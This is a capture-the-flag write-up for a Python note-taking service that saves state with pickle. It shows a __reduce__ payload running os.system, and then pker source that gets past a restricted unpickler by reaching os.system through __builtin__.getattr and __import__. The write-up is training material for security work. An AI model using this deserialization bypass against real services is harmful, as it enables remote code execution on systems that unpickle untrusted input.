# Gurkburk
 - Category: Misc
 - Points: 96
 - Solved by: `fkil`


### Description

A simple note taking service that lets you save and load the current state.

### Solution

After inspecting the save-string we received, we found out that the service uses the exploitable python `pickle` module to serialize and unserialize the state.

When trying the simple payload:

```python
class payload(object):
    def __reduce__(self):
       comm = "cat ./flag.txt"
       return os.system, (comm,)
```
We get the following error:
```
pickle.UnpicklingError: Your pickle is trying to load something sneaky. Only the modules __main__, __builtin__ and copyreg are allowed. eval and exec are not allowed. 'posix.system' is forbidden
```

Note, that the `pickle` format itself is an interpreted language and you can create arbitrary
sequences of calls.

We then used `__builtin__.getattr` and `__builtin__.__import__` to get `os.system` and
call it with `'cat ./flag.txt'`.

We created our payload using `pker`(https://github.com/eddieivan01/pker) with the following source:
```python
_getattr = GLOBAL('__builtin__', 'getattr')
_import = GLOBAL('__builtin__', '__import__')
_os = _import('os')
_system = _getattr(_os, 'system')
_system('cat ./flag.txt')
return
```
